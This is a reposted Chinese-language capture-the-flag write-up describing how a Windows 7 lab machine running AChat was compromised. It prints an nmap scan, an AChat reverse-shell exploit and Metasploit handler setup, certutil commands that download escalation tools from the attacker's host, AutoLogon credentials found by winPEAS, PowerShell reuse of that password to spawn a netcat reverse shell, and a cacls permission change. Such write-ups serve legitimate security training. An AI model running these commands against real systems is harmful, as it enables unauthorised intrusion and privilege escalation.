> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/grZYtyZ-6FFdVieKvN3byw)

点击上方 “蓝字” 关注公众号获取最新信息!

> 本文作者：Twe1ve（贝塔安全实验室 - 核心成员）

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qkITKc4PTCiawLuicN8z4hQFYZibuGMmq4GmKP9xiaia4ibCnPLdiamOZssnIWFjiaQwFx2IOPcRUGjPpfVJA/640?wx_fmt=png)

nmap 扫描结果：  

```
PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   AChat chat system
```

Achat Exploit ： https://www.youtube.com/watch?v=YgC_Rl6x3aM

**1. 生成 paylaod**

```
kali@kali:~/tools/others/AChat-Reverse-TCP-Exploit$ bash AChat_Payload.sh
RHOST: 10.10.10.74LPORT: 4444
LHOST: 10.10.14.61
```

**2. 用生成的 payload 替换 py 脚本中的 payload，并修改 server_address**

**3.msf**

```
use exploit/multi/handler
set payload windows/shell/reverse_tcp
...
```

**4.python AChat_Exploit.py**

### 得到一个用户 shell，post/multi/manage/shell_to_meterpreter  ### 升级为 meterpreter shell，此处是升级失败

msf suggest 提权模块不能获取可以提权的模块使用提权脚本看一下

由于是 windows 7，使用证书下载试试看

```
certutil.exe -urlcache -split -f http://10.10.14.61:8000/winPEAS.exe  1.exe
certutil.exe -urlcache -split -f http://10.10.14.61:8000/ms16-075.exe  2.exe
certutil.exe -urlcache -split -f http://10.10.14.61:8000/41015.exe  3.exe
.....
```

提权模块都失败

winPEAS：

```
Some AutoLogon credentials were found!!
    DefaultUserName               :  35mAlfred
    DefaultPassword               :  Welcome1!
```

撞一下密码：(这里没想到的是这台 win 7 竟然装了 powershell)

```
$pass = convertTo-SecureString 'Welcome1!' -AsPlainText -Force                     
$cred= New-Object System.Management.Automation.PSCredential("Administrator",$pass)
Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred  ###验证是否是正确的凭证
Invoke-Command -Computer Sniper -ScriptBlock { dir } -Credential $cred
Invoke-Command -Computer Sniper -ScriptBlock { C:\ProgramData\nc.exe 10.10.15.64  9999 -e cmd.exe } -Credential $cred
```

**另一种玩法：**

#### 由于直接直接查看 root.txt，只是拒绝用户访问，所以可以通过修改 root.txt 的文件权限来使它可读

```
cacls.exe c:\users\Administrator\Desktop\root.txt /c /e /t /g Alfred:F
```